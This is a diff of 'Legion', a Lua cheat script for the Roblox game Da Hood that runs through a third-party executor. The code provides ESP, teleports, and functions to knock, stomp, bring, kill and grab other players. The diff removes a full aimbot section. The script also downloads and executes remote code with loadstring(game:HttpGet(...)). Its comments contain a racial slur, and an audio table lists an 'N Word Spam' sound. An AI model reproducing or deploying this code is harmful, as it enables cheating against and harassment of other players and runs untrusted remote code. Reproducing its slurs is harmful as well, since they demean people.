@@ -1,29 +1,5 @@
 local Buffer = {}
-Buffer.__index = Buffer
-
-local Players = game:GetService("Players")
-local SupportedPlaceIDs = {2788229376}
-
-local player = Players.LocalPlayer
-
-
-local function checkPlaceID()
-    local currentPlaceID = game.PlaceId
-    local isSupported = false
-
-    for _, id in ipairs(SupportedPlaceIDs) do
-        if currentPlaceID == id then
-            isSupported = true
-            break
-        end
-    end
-
-    if not isSupported then
-        player:Kick("unsupported game, goto da hood and run legion again. discord.gg/legiondh")
-    end
-end
-
-checkPlaceID()
+Buffer.__index = Buffer -- putted by faisal8754 they deleted it but i toke it
 
 function Buffer.new(size, autoFlushSize, autoFlushInterval)
 	local self = setmetatable({
@@ -175,7 +151,7 @@ function Buffer:delete()
 	if self.autoFlushInterval then
 	end
 
-	
+	--> gcinfo("collect")
 end
 
 local MainBuffer = Buffer.new(10,4)
@@ -243,7 +219,7 @@ MainBuffer:write(function()
 
 		self.Corner = Instance.new("UICorner",self.Main)
 
-		
+		-- // Traffic Lights for ui toggle and shit \\--
 		self.TrafficLights = Instance.new("Frame",self.Main)
 		self.Red = Instance.new("TextButton",self.TrafficLights)
 		self.Yellow = Instance.new("TextButton",self.TrafficLights)
@@ -253,18 +229,18 @@ MainBuffer:write(function()
 		self.YellowCorner = Instance.new("UICorner",self.Yellow)
 		self.GreenCorner = Instance.new("UICorner",self.Green)
 
-		
+		-- // Line Seperators \\--
 		self.lineseperator_1 = Instance.new("Frame",self.Main)
 		self.lineSeperators_2 = Instance.new("Frame",self.Main)
 		self.lineSeperators_3 = Instance.new("Frame",self.Main)
 		self.lineSeperators_4 = Instance.new("Frame",self.Main)
 
-		
+		-- // Shadow \\--
 		self.Shadow = Instance.new("Frame",self.Main)
 		self.DropShadow = Instance.new("ImageLabel",self.Shadow)
 
 
-		
+		-- // Scripting ig? \\--
 		self.Main.AnchorPoint = Vector2.new(0.5,0.5)
 		self.Main.BackgroundColor3 = Color3.fromRGB(10,10,10)
 		self.Main.BackgroundTransparency = 0.050
@@ -446,7 +422,7 @@ MainBuffer:write(function()
 
 
 
-		
+		--self.Tabs =self.Tabs = {}
 		return self 
 	end
 
@@ -466,7 +442,7 @@ MainBuffer:write(function()
 		TabToggles[#TabToggles+1] = options.Name 
 
 
-		
+		--local AssignedTab = Instance.new("Frame",)
 		local TabContainer = Instance.new("Frame",self.Main)
 		local LineSeperator = Instance.new("Frame",TabContainer)
 
@@ -492,7 +468,7 @@ MainBuffer:write(function()
 		local TabLogo = Instance.new("ImageLabel",TabButton)
 
 
-		
+		--Properties:
 
 		Right.Name = "Right"
 		Right.Active = true
@@ -571,7 +547,7 @@ MainBuffer:write(function()
 		TabButton.Text = ""
 		TabButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 		TabButton.TextSize = 14.000
-		-- added comment to makke sure error fixed
+
 		TabLabel.Name = Services.HttpService:GenerateGUID(true)
 		TabLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 		TabLabel.BackgroundTransparency = 1.000
@@ -585,7 +561,7 @@ MainBuffer:write(function()
 		TabLabel.TextSize = 16
 		TabLabel.TextXAlignment = Enum.TextXAlignment.Left
 
-		
+		--[[
 		TabLogo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 		TabLogo.BackgroundTransparency = 1.000
 		TabLogo.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -593,13 +569,14 @@ MainBuffer:write(function()
 		TabLogo.Position = UDim2.new(0.0200554, 0, 0.25, 0)
 		TabLogo.Size = UDim2.new(0, 18,0,18)
 		TabLogo.Image = options.Image
+		]]
 
 
 		function Tab:Section(options)
 			local Sections = {}
 			Sections.Name = options.Name
 			Sections.Where = options.Side or "Left"
-			
+			-- Create the section frame
 			local Section = Instance.new("Frame", TabContainer[Sections.Where])
 			local UiCorner = Instance.new("UICorner", Section)
 			local UIListLayout = Instance.new("UIListLayout", Section)
@@ -756,7 +733,7 @@ MainBuffer:write(function()
 
 				ToggleStatus.Name = "ToggleStatus"
 				ToggleStatus.AnchorPoint = Vector2.new(0.5, 0.5)
-				ToggleStatus.BackgroundColor3 = Color3.fromRGB(0,0,0) 
+				ToggleStatus.BackgroundColor3 = Color3.fromRGB(0,0,0) -- 81, 194, 58
 				ToggleStatus.BorderColor3 = Color3.fromRGB(255, 255, 255)
 				ToggleStatus.BorderSizePixel = 0
 				ToggleStatus.Position = UDim2.new(0.899999976, 0, 0.5, 0)
@@ -1504,16 +1481,7 @@ MainBuffer:write(function()
     local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
 
 
-	
-	local executorName = identifyexecutor()  
-	if not executorName then
-		executorName = "Unknown"  
-	end
-
-	print("Executor Name: " .. executorName)
-
-	local legion = Legion.new({Title = "Legion ", Credits = "discord.gg/legiondh | Exec name: " .. executorName})
-
+	local legion = Legion.new({Title="Legion ",Credits = "Iux Skid, Fixed By: faisal8754"})
 	local Holder = Instance.new("Model",workspace)
 
 
@@ -1534,7 +1502,7 @@ MainBuffer:write(function()
 		|______\___|\__, |_|\___/|_| |_|
 					__/ |              
 					|___/               
-		
+		--------------------------------
 		  https://discord.gg/Yh8GPhQK9r
 
 
@@ -1554,14 +1522,12 @@ MainBuffer:write(function()
 	local Virtualize = function(...) 
 		return ... 
 	end;
-	
+	-- Variables
 	local LiveConnections = {}
 	local Tabs = {
 		Player = legion:Tab({ Name = "Player", Image = getAsset("Player")}),
 
 		Target = legion:Tab({ Name = "Target", Image = getAsset("Target")}),
-
-		Aimbot = legion:Tab({ Name = "Aimbot", Image = getAsset("Target")}),
 
 		Grabs = legion:Tab({ Name = "Grabs", Image = getAsset("Folder")}),
 
@@ -1666,7 +1632,7 @@ MainBuffer:write(function()
 			["Effects"] = true,
 
 			["Hoverboard"] = false,
-			["GrabbedCharacter"] = nil, 
+			["GrabbedCharacter"] = nil, -- um später zu accessen
 		},
 
 		["Player"] = {
@@ -1694,7 +1660,7 @@ MainBuffer:write(function()
 	}
 
 
-	
+	--> I INFACT do not know why I defined Services twice lmao 
 	local Services = {
 		Players = game:GetService("Players"),
 		LocalPlayer = game:GetService("Players").LocalPlayer,
@@ -1712,7 +1678,7 @@ MainBuffer:write(function()
 
 	local Modules = {
 
-		
+		--[[ Grab ]]--
 		["Grab"] = function(character,grabAnimation)
 			assert(character ~= nil,"Character is nil")
 			assert(Settings["Grab"]["Grab"] == true,"Grab is false cant continue")
@@ -1994,7 +1960,7 @@ MainBuffer:write(function()
 		end,
 
 		["InvisDesync"] = function(key)
-			
+			--> Kinda "Invis"
 
 			local Char = Services.LocalPlayer.Character
 			local AnimTracks = {}
@@ -2120,7 +2086,7 @@ MainBuffer:write(function()
 		end,
 
 		["CameraEffect"] = function(char,waitTime)
-			
+			--> only useful for "Portal"
 
 			local camera = workspace.CurrentCamera
 			camera.CameraType = Enum.CameraType.Scriptable
@@ -2234,8 +2200,8 @@ MainBuffer:write(function()
 		end,
 		["Kill"] = function ()
 
-			
-			
+			--> this is the ugliest kill source holy shit lmao
+			--> I never really worked on so its shitty, anyways byee 
 
 			getgenv().Old = Services.LocalPlayer.Character.HumanoidRootPart.CFrame
 			local Countdown = 1.5
@@ -2464,9 +2430,6 @@ MainBuffer:write(function()
 			end 
 			Services.LocalPlayer.Character.HumanoidRootPart.CFrame = Old
 		end,
-
-		
-
 		["Stomp"] = function ()
 			getgenv().Old = Services.LocalPlayer.Character.HumanoidRootPart.CFrame
 			if Services.Workspace.Players[Settings["Target"]["Player"]]:FindFirstChild("BodyEffects")["K.O"].Value then 
@@ -2609,7 +2572,7 @@ MainBuffer:write(function()
 		end, 
 
 		["Disguise"] = function(char,userid)
-			
+			--assert(char:FindFirstChild("HumanoidRootPart")==true,"Char is invalid")
 
 			if Cache["Loops"]["Disguise"] ~= nil then 
 				Cache["Loops"]["Disguise"]:Disconnect()
@@ -2806,7 +2769,7 @@ MainBuffer:write(function()
 		end,
 
 		["AntiGrab"] = function()
-			
+			-- Disconnecting old loops
 			if Cache["Connections"]["AntiGrab"] ~= nil then 
 				Cache["Connections"]["AntiGrab"]:Disconnect()
 				Cache["Connections"]["AntiGrab"] = nil 
@@ -2832,7 +2795,7 @@ MainBuffer:write(function()
 		end ,
 
 		["AutoDodge"] = function()
-			
+			--> ignore this 
 
 			if Cache["Loops"]["AutoDodge"] ~= nil then 
 				Cache["Loops"]["AutoDodge"]:Disconnect()
@@ -2903,10 +2866,6 @@ MainBuffer:write(function()
 			end 
 		end,
 
-		["Chat Bypass"] = function()
-			print("
-		end,
-		
 		["Stop"] = function(id,key)
 			Services.ReplicatedStorage:WaitForChild("MainEvent"):FireServer("BoomboxStop")
 		end,
@@ -2962,9 +2921,8 @@ MainBuffer:write(function()
 			return output
 		end,
 
-		
 
-		
+		-- [[ Control set up ]]--
 		["CloneCharacter"] = function(character)
 			character.Archivable = true 
 
@@ -3053,7 +3011,7 @@ MainBuffer:write(function()
 			Part2.CanCollide = false
 		end,
 
-		
+		-- [[ Destroy Tool ]]--
 		["DestroyTool"] = function(toolName)
 			local Tool = Services.LocalPlayer.Backpack:FindFirstChild(toolName)  or Services.LocalPlayer.Character:FindFirstChild(toolName)
 			if Tool then 
@@ -3106,27 +3064,27 @@ MainBuffer:write(function()
 	} 
 
 	local Animations = {
-		
+		--Basic
 		["Grab"] = Modules["CreateAnimation"]("3135389157"),
 		["Roll"] = Modules["CreateAnimation"]("2791328524"),
 		["Angry"] = Modules["CreateAnimation"]("2788838708"),
 		["Punch"] = Modules["CreateAnimation"]("3354696735"),
 		["Elevate"] = Modules["CreateAnimation"]("11394033602"),
 
-		
+		--Niggers
 		["Double_Handle"] = Modules["CreateAnimation"]("4784557631"),
 		["Get Over Here"] = Modules["CreateAnimation"]("16768625968"),
 
-		
+		--Iron Man
 		["IM_Freefall"] = Modules["CreateAnimation"]("13850654420"),
 		["IM_Land"] = Modules["CreateAnimation"]("13850663836"),
 		["IM_Rizzler"] = Modules["CreateAnimation"]("13850680182"),
 
-		
+		-- Ora
 		["Ora1"] = Modules["CreateAnimation"]("8254787838"),
 		["Ora2"] = Modules["CreateAnimation"]("8254794168"),
 
-		
+		-- Punch back 
 		["Punch back"] = Modules["CreateAnimation"]("17360699557"),
 
 		["Time Stop Charging"] = Modules["CreateAnimation"]("10714177846"),
@@ -3146,19 +3104,19 @@ MainBuffer:write(function()
 		["Loud Za Warudo"] = "8981087259",
 		["N Word Spam"] = "5986485937",
 
-		
+		-- Get Over Here
 		["Get Over Here!"] = "8643750815",
 		["Chain"] = "7592607446",
 
-		
-		["Dora"] = "6995347277", 
-		["Ora Barrage"] = "6678126154", 
-		["SaW Ora Barrage"] = "6599245588", 
-		["Short Muda"] = "6564057272", 
+		-- Barrages, JoJo
+		["Dora"] = "6995347277", -- Josuke
+		["Ora Barrage"] = "6678126154", -- Jotaro
+		["SaW Ora Barrage"] = "6599245588", -- Josuke P8
+		["Short Muda"] = "6564057272", -- Diego AU 
 
 
 
-		
+		-- Time Stop 
 		["Time Stop"] = "5455437798",
 		["Time Resume"] = "3084539117",
 		["When Time is Stopped, There is Only Dio!"] = "6964764259",
@@ -3169,11 +3127,11 @@ MainBuffer:write(function()
 		["Loud Time Resume"] = "6995347277",
 
 		["VoiceLines"] = {
-				["This is a test"] = "6949881467", 
-				["Impossible!? I can't Move"] = "6946266008", 
-				["The one who misread one move... were You."] = "6665016112", 
-				["Weakling, Weakling!"] = "6924545163", 
-				["I'll teach you the meaning of the word 'retire'"] = "7075003019", 
+				["This is a test"] = "6949881467", -- Doppio
+				["Impossible!? I can't Move"] = "6946266008", -- Dio
+				["The one who misread one move... were You."] = "6665016112", -- Funny Valentine
+				["Weakling, Weakling!"] = "6924545163", -- Dio
+				["I'll teach you the meaning of the word 'retire'"] = "7075003019", -- Diego AU
 				["but for you, I feel no pity at all."] = "5842011186",
 				["I've been possessed by an evil spirit."] = "5463102834",
 				["The one to Judge you is my Stand!"] = "5807033225",
@@ -3230,11 +3188,11 @@ MainBuffer:write(function()
 			
 
 		},
-		
+		-- Voicelines idk 
 
 	}
 
-	
+	--> Removed: Control,Sex and Hoverboard because we do not want skids
 	
 	local Tools = {
 	
@@ -3265,7 +3223,7 @@ MainBuffer:write(function()
 						Load:Play()
 						task.wait(2.5)
 
-						Modules["StopAnimation"](Services.LocalPlayer.Character,"10714177846") 
+						Modules["StopAnimation"](Services.LocalPlayer.Character,"10714177846") -- time stop charging
 						Modules["StopAudio"]()
 						task.wait(0.3)
 
@@ -3661,14 +3619,14 @@ MainBuffer:write(function()
 							BodyGyro.CFrame = Services.LocalPlayer.Character.HumanoidRootPart.CFrame 
 							
 							Services.TweenService:Create(Clone.HumanoidRootPart, TweenInfo.new(0.4, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {CFrame = CFrame.new(rootPart.Position+ rootPart.CFrame.LookVector * -3+ rootPart.CFrame.RightVector * -1+ Vector3.new(0, math.random(3,4.2), 0))}):Play()
-							
+							--[[
 							if Services.LocalPlayer.Character.Humanoid.MoveDirection.Magnitude  > 0 and not Modules["CheckForAnimation"](Clone,3541044388) then 
 								Modules["StopAnimation"](Clone,3541114300)
 								Modules["AnimPlay"](Clone,3541044388)
 							elseif not Modules["CheckForAnimation"](Clone,3541114300) and Services.LocalPlayer.Character.Humanoid.MoveDirection.Magnitude == 0 then 
 								Modules["StopAnimation"](Clone,3541044388)
 								Modules["AnimPlay"](Clone,3541114300)
-							end ]]
+							end ]]--
 
 						end)
 						Modules["AnimPlay"](Clone,3541114300)
@@ -3935,7 +3893,7 @@ MainBuffer:write(function()
 
 					Modules["StopAnimation"](Clone,4940561610)
 					yes = true 
-					
+					--Services.Workspace.Camera.CameraSubject = Hum
 					Modules["NoVelocity"](GrabbedChar)
 					Modules["TweenPosition"](BodyPos,6, Clone.UpperTorso.Position + Vector3.new(0,20,0))
 
@@ -3985,265 +3943,18 @@ MainBuffer:write(function()
 
 	Modules["AddEnv"]("Legion",Tabs)
 
-
-
-local AimbotSection = Tabs.Aimbot:Section({Side = "Left"})
-
-
-getgenv().Prediction = 0.1248710929171
-getgenv().AimPart = "HumanoidRootPart"
-getgenv().Key = Enum.KeyCode.C
-getgenv().DisableKey = Enum.KeyCode.P
-getgenv().AutoPrediction = false 
-getgenv().FOVSize = 55 
-getgenv().FOV = true 
-getgenv().AimbotEnabled = false 
-getgenv().JumpOffsetX = 0.03 
-getgenv().JumpOffsetY = 0.06 
-
-
-AimbotSection:Input({
-    Text = "Prediction",
-    PlaceHolder = "Enter prediction value",
-    Callback = function(value)
-        getgenv().Prediction = tonumber(value) or getgenv().Prediction
-    end
-})
-
-AimbotSection:Input({
-    Text = "Jump Offset X",
-    PlaceHolder = "Enter jump offset value for X",
-    Callback = function(value)
-        getgenv().JumpOffsetX = tonumber(value) or getgenv().JumpOffsetX
-    end
-})
-
-AimbotSection:Input({
-    Text = "Jump Offset Y",
-    PlaceHolder = "Enter jump offset value for Y",
-    Callback = function(value)
-        getgenv().JumpOffsetY = tonumber(value) or getgenv().JumpOffsetY
-    end
-})
-
-AimbotSection:Dropdown({
-    Text = "Aim Part",
-    Options = {"HumanoidRootPart", "Head", "Torso"},
-    Callback = function(selected)
-        getgenv().AimPart = selected
-    end
-})
-
-AimbotSection:KeyBind({
-    Text = "Aim Keybind",
-    Default = getgenv().Key,
-    Callback = function(key)
-        getgenv().Key = key
-    end
-})
-
-AimbotSection:KeyBind({
-    Text = "Disable Keybind",
-    Default = getgenv().DisableKey,
-    Callback = function(key)
-        getgenv().DisableKey = key
-    end
-})
-
-AimbotSection:Input({
-    Text = "FOV Size",
-    PlaceHolder = "Enter FOV size",
-    Callback = function(value)
-        getgenv().FOVSize = tonumber(value) or getgenv().FOVSize
-    end
-})
-
-
-AimbotSection:Toggle({
-    Text = "Enable Aimbot",
-    Default = false,
-    Callback = function(state)
-        getgenv().AimbotEnabled = state
-        Notify(state and "Aimbot enabled!" or "Aimbot disabled!")
-        if not state then
-            Locked = false
-            Victim = nil
-        end
-    end
-})
-
-
-AimbotSection:Toggle({
-    Text = "Auto Prediction",
-    Default = false,
-    Callback = function(state)
-        getgenv().AutoPrediction = state
-        Notify(state and "Auto Prediction enabled!" or "Auto Prediction disabled!")
-    end
-})
-
-
-local Players = game:GetService("Players")
-local RS = game:GetService("RunService")
-local Camera = workspace.CurrentCamera
-local Mouse = Players.LocalPlayer:GetMouse()
-
-
-local Locked = false
-local Victim
-
-
-function Notify(title, description)
-    Notification:Notify(
-        {Title = title, Description = description},
-        {OutlineColor = Color3.fromRGB(30, 30, 30), Time = 10, Type = "image"},
-        {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(255, 84, 84)}
-    )
-end
-
-
-local fov = Drawing.new("Circle")
-fov.Filled = false
-fov.Transparency = 1
-fov.Thickness = 1
-fov.Color = Color3.fromRGB(255, 255, 0)
-fov.NumSides = 1000
-
-
-function updateFOV()
-    if getgenv().FOV then
-        fov.Radius = getgenv().FOVSize * 2
-        
-        local screenWidth = workspace.CurrentCamera.ViewportSize.X
-        local screenHeight = workspace.CurrentCamera.ViewportSize.Y
-        fov.Position = Vector2.new(screenWidth / 2, screenHeight / 2)
-        fov.Visible = true
-    else
-        fov.Visible = false
-    end
-end
-
-
-function getClosest()
-    local closestPlayer
-    local shortestDistance = math.huge
-
-    for _, player in pairs(Players:GetPlayers()) do
-        if player ~= Players.LocalPlayer and player.Character and player.Character:FindFirstChild(getgenv().AimPart) then
-            local pos = Camera:WorldToViewportPoint(player.Character[getgenv().AimPart].Position)
-            local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(Mouse.X, Mouse.Y)).magnitude
-
-            if magnitude < shortestDistance and magnitude < fov.Radius then
-                closestPlayer = player
-                shortestDistance = magnitude
-            end
-        end
-    end
-
-    return closestPlayer
-end
-
-
-function updatePrediction()
-    if getgenv().AutoPrediction then
-        local pingValue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
-        local split = string.split(pingValue, '(')
-        local ping = tonumber(split[1])
-
-        
-        if ping < 20 then
-            getgenv().Prediction = 0.110 
-            getgenv().JumpOffsetX = 0.06
-            getgenv().JumpOffsetY = 0.03
-        elseif ping < 40 then
-            getgenv().Prediction = 0.12599934923895332799965465783
-            getgenv().JumpOffsetX = 0.06
-            getgenv().JumpOffsetY = 0.03
-        elseif ping < 70 then
-            getgenv().Prediction = 0.135 
-            getgenv().JumpOffsetX = 0.05
-            getgenv().JumpOffsetY = 0.04
-        elseif ping < 90 then
-            getgenv().Prediction = 0.140 
-            getgenv().JumpOffsetX = 0.04
-            getgenv().JumpOffsetY = 0.05
-        elseif ping < 110 then
-            getgenv().Prediction = 0.14377940513099224789078568759678573
-            getgenv().JumpOffsetX = 0.03
-            getgenv().JumpOffsetY = 0.06
-        elseif ping < 120 then
-            getgenv().Prediction = 0.15147645025313099224997899045997856569
-            getgenv().JumpOffsetX = 0.03
-            getgenv().JumpOffsetY = 0.06
-        else
-            getgenv().Prediction = 0.15 
-            getgenv().JumpOffsetX = 0.03
-            getgenv().JumpOffsetY = 0.03
-        end
-    end
-end
-
-
-Mouse.KeyDown:Connect(function(k)
-    if k:lower() == getgenv().Key.Name:lower() and getgenv().AimbotEnabled then
-        Locked = not Locked
-        if Locked then
-            Victim = getClosest()
-            if Victim then
-                Notify("Locked onto: " .. Victim.Name)
-            else
-                Notify("No targets found.")
-            end
-        else
-            Victim = nil
-            Notify("Unlocked!")
-        end
-    elseif k:lower() == getgenv().DisableKey.Name:lower() then
-        AimlockState = not AimlockState
-        if not AimlockState and Locked then
-            Locked = false
-            Victim = nil
-            Notify("Aimlock disabled and unlocked!")
-        end
-    end
-end)
-
-
-RS.RenderStepped:Connect(function()
-    updateFOV()
-    updatePrediction() 
-    if Locked and Victim and getgenv().AimbotEnabled then
-        local targetPosition = Victim.Character[getgenv().AimPart].Position
-        local aimPosition = targetPosition + Vector3.new(getgenv().JumpOffsetX, getgenv().JumpOffsetY, 0)
-
-        
-        local cameraCFrame = CFrame.new(Camera.CFrame.Position, aimPosition)
-
-        
-        Camera.CFrame = cameraCFrame
-    end
-end)
-
-	
+	-- Visuals Page 
 	local ESPSection = Tabs.Visuals:Section({Side = "Left"})
 	
 	ESPSection:Toggle({Text = "ESP", Default = false, Callback = function(state)
 		EspLibrary.teamSettings.enemy.enabled = state
 		if state then
 			EspLibrary.Load()		
-			
+			--> print("yes")	was for debugging 
 		else
 			EspLibrary.Unload()
 		end
 	end})
-    ESPSection:Toggle({Text = "Toggle Fog", Default = false, Callback = function(state)
-        if state then
-            game.Lighting.FogEnd = 50
-            game.Lighting.FogColor = Color3.fromRGB(128, 128, 128)
-        else
-            game.Lighting.FogEnd = 100000
-        end
-    end})       
 	ESPSection:Toggle({Text = "ESP Boxes", Default = false, Callback = function(state)
 		EspLibrary.teamSettings.enemy.box = state
 	end})
@@ -4262,7 +3973,7 @@ end)
 	ESPSection:Toggle({Text = "ESP Chams", Default = false, Callback = function(state)
 		EspLibrary.teamSettings.enemy.chams = state
 	end})
-	
+	--[[
 	brocken rn
 	Tabs.Visuals:AddToggle("Esp",{Title = "Esp",Description="Enables Esp",Default = false,Callback = function(state)
 	    EspLibrary:Toggle(state) 
@@ -4281,8 +3992,8 @@ end)
 	        EspLibrary.Color = value 
 	    end
 	})]]
-	
-	
+	-- Voicelines Page
+	-- Voicelines Section
 	local voiceLinesSections = {
 		Tabs.VoiceLines:Section({Side = "Left"}),
 		Tabs.VoiceLines:Section({Side = "Right"})
@@ -4303,17 +4014,17 @@ end)
 	end 
 
 
-	
+	-- Teleports Section
 	local teleportsSection = Tabs.Teleports:Section({Side = "Left"})
 
-	
+	-- Dropdown for Saved Teleports
 	local TeleportList = teleportsSection:Dropdown({Text = "Saved Teleports...", Options = Modules["GetTps"]() or {"Nil"}, Callback = function(item)
 		if not Start then 
 			Services.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = Modules["StringToCFrame"](readfile(item))
 		end 
 	end})
 
-	
+	-- Custom Teleport Input
 	teleportsSection:Input({Text="Save tp", PlaceHolder = "Enter your Name for your custom TP", Callback = function(name)
 		if isfolder("Legion/TP") then
 			writefile("Legion/TP/"..name..".txt", Modules["CFrameToString"](Services.LocalPlayer.Character.HumanoidRootPart.CFrame))
@@ -4325,7 +4036,7 @@ end)
 		TeleportList:Refresh(Modules["GetTps"]())
 	end})
 
-	
+	-- Dropdown for Bank Teleport
 	teleportsSection:Dropdown({Text = "Bank", Options = {"Food from bank", "Bank"}, Callback = function(option)
 		if option == "Food from bank" then
 			Services.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-336.5518493652344, 23.645301818847656, -294.3374328613281)
@@ -4334,15 +4045,7 @@ end)
 		end
 	end})
 
-	teleportsSection:Dropdown({Text = "Safe Teleports", Options = {"Safe1", "Safe2"}, Callback = function(option)
-		if option == "Safe1" then
-			Services.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-756.7930297851562, 143.12481689453125, -1123.5323486328125)
-		elseif option == "Safe2" then
-			Services.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-756.7930297851562, 143.12481689453125, -1123.5323486328125)
-		end
-	end})
-
-	
+	-- Dropdown for Downhill Teleport
 	teleportsSection:Dropdown({Text = "Downhill",Options = {"Armor Downhill", "Gunz Downhill"}, Callback = function(option)
 		if option == "Armor Downhill" then
 			Services.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-591.8069458007812, 10.312345504760742, -791.7643432617188)
@@ -4351,7 +4054,7 @@ end)
 		end
 	end})
 
-	
+	-- Dropdown for Uphill Teleport
 	teleportsSection:Dropdown({Text = "Uphill", Options = {"Armor Uphill", "Food Uphill", "Gunz Uphill", "Uphill Park"}, Callback = function(option)
 		if option == "Armor Uphill" then
 			Services.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(549.1211547851562, 50.519630432128906, -627.4512939453125)
@@ -4364,11 +4067,10 @@ end)
 		end
 	end})
 
-
-	
+	-- Target Section
 	local targetSection = Tabs.Target:Section({Side = "Left"})
 
-	
+	-- Target Player Input
 	targetSection:Input({Text="Target", PlaceHolder = "Enter the target's name", Callback = function(name)
 		local targetPlayer = Modules["GetPlayer"](name)
 		if targetPlayer then
@@ -4381,7 +4083,7 @@ end)
 		end
 	end})
 
-	
+	-- Dropdown for Target Mode
 	targetSection:Dropdown({Text = "Target mode...", Options = {"Default", "Under", "Above"}, Callback = function(item)
 		if item then 
 			Settings["Target"]["Mode"] = item
@@ -4389,7 +4091,7 @@ end)
 		end 
 	end})
 
-	
+	-- Knock Player Toggle
 	targetSection:Toggle({Text = "Knock Player...", Default = false, Callback = function(state)
 		if Settings["Target"]["Player"] then 
 			Settings["Target"]["Kill"] = state 
@@ -4397,7 +4099,7 @@ end)
 		end 
 	end})
 
-	
+	-- Bring Player Toggle
 	targetSection:Toggle({Text = "Bring Player...", Default = false, Callback = function(state)
 		if Settings["Target"]["Player"] then 
 			Settings["Target"]["Kill"] = state 
@@ -4405,7 +4107,7 @@ end)
 		end 
 	end})
 
-	
+	-- Stomp Player Toggle
 	targetSection:Toggle({Text = "Stomp Player...", Default = false, Callback = function(state)
 		if Settings["Target"]["Player"] then 
 			Settings["Target"]["Kill"] = state 
@@ -4413,7 +4115,7 @@ end)
 		end 
 	end})
 
-	
+	-- View Player Toggle
 	targetSection:Toggle({Text = "View Player...", Default = false, Callback = function(state)
 		if state then 
 			Modules["View"](Settings["Target"]["Player"])
@@ -4422,8 +4124,8 @@ end)
 		Modules["View"](Services.LocalPlayer.Name)
 	end})
 
-	
-	
+	-- Grenade TP Toggle
+	--[[
 	targetSection:Toggle({Name = "Grenade TP...", Flag = "grenade_tp", Default = false, Callback = function(state)
 		if Settings["Target"]["Player"] then 
 			Settings["Target"]["Grenade"] = state
@@ -4432,7 +4134,7 @@ end)
 	end})
 	]]
 
-	
+	-- Teleport to Player Button
 	targetSection:Button({Text = "Teleport to Player", Callback = function()
 		if Settings["Target"]["Player"] then 
 			Services.LocalPlayer.Character.HumanoidRootPart.CFrame = Services.Workspace.Players:FindFirstChild(Settings["Target"]["Player"]).HumanoidRootPart.CFrame 
@@ -4455,7 +4157,7 @@ end)
 			Services.LocalPlayer.Character.HumanoidRootPart.CFrame = Old 
 		end 
 	end})
-	
+	-- Player Section
 	local playerSection = Tabs.Player:Section({Side="Left"})
 
 
@@ -4467,15 +4169,15 @@ end)
 		Modules["Chat"](Modules["TurnTextToFont"](text))
 	end})
 
-	
+	-- CFrame Speed Toggle
 	
 
-	
+	-- Auto Box Toggle
 	playerSection:Toggle({Text = "Auto Box", Default = false, Callback = function(state)
 		Settings["Player"]["AutoBox"] = state
 	end})
 
-	
+	-- Anti Stomp Toggle
 	playerSection:Toggle({Text = "Anti Stomp", Default = false, Callback = function(state)
 		Settings["Player"]["AntiStomp"] = state 
 	end}) 
@@ -4613,7 +4315,7 @@ end)
 		end 
 	end})
 
-	
+	--[[
 	playerSection:Toggle({Name = "Auto Dodge",Flag="auto_dodge",Default=false,Callback=function(state)
 		Settings["Player"]["AutoDodge"] = state 
 		Modules["AutoDodge"]()
@@ -4622,7 +4324,7 @@ end)
 	
 
 	
-	
+	-- Speed Slider
 	local CFrame = Tabs.Player:Section({Side = "Right"})
 	CFrame:Toggle({Text = "CFrame Speed",Default = false, Callback = function(state)
 		Settings["Player"]["CFrameSpeed"] = state
@@ -4714,7 +4416,7 @@ end)
 	     
 	end})
 
-	
+	-- Grabs Section
 	local GrabSections = {
 		Tabs.Grabs:Section({Side = "Left"}),
 	}
@@ -4722,7 +4424,7 @@ end)
 	local old_fog = game.Lighting.FogEnd
 	local old_fog_color = game.Lighting.FogColor
 
-	
+	-- Grabs Page
 	GrabSections[1]:Toggle({Text = "Grab",Default = false,Callback = function (state)
 		Settings["Grab"]["Grab"] = state 
 		if not Settings["Grab"]["Grab"] then 
@@ -4784,7 +4486,7 @@ end)
 		Settings["Grab"]["Effects"] = state 
 	end})
 
-	
+	--> I do NOT wanna manually add the fucking tools lmao 
 	for name,func in pairs(Tools) do 
 		if name == "Mind Control" then 
 			
@@ -4812,17 +4514,15 @@ end)
 	end
 
 	local CreditsSection = Tabs.Credits:Section({Side = "Left"})
-	
-	CreditsSection:Button({Text="kyeeluur [kyeeluur on dc]",Callback = function() print("discord.gg/legiondh") end })
-	CreditsSection:Button({Text="Fade [sillehfade on dc]",Callback = function() print("discord.gg/internalx") end })
-	CreditsSection:Button({Text="Faisals [Main Creator Dev]",Callback = function() print("hi") end })
+	-- Credits 
+	CreditsSection:Button({Text="kyeeluur [kyeeluur on dc]",Callback = function() print("hi") end })
 	CreditsSection:KeyBind({Text = "UI Toggle", Default = Enum.KeyCode.Insert, Callback = function(key)
 		if Main then
 			Main.Visible = not Main.Visible
 		end 
 	end});
 
-	
+	-- final shit and stuff
 
 	Modules["CFrame Speed"]()
 	Modules["AntiStomp"]()
@@ -4832,7 +4532,7 @@ end)
 
 
 
-	
+	--> this will give you eye cancer reading cause I wrote this at 3 am :sob_praying:
 	Services.LocalPlayer.CharacterAdded:Connect(function (char)
 		repeat task.wait() until char:FindFirstChild("BodyEffects")
 		if Cache["Connections"]["Grab"] ~= nil then 
@@ -4893,7 +4593,7 @@ end)
 		end
 	end)
 
-	
+	-- stop throwing animation for rip tools 
 	Services.RunService.Heartbeat:Connect(function()
 		Modules["StopAnimation"](Services.LocalPlayer.Character,"4798175381")
 	end)
@@ -4903,401 +4603,5 @@ end)
 pcall(function()
 	MainBuffer:flush()
 	MainBuffer:delete()
-	
-end)
-
-local Players = game:GetService("Players")
-local Commands = {}
-local defaultWalkSpeed = 16
-
-
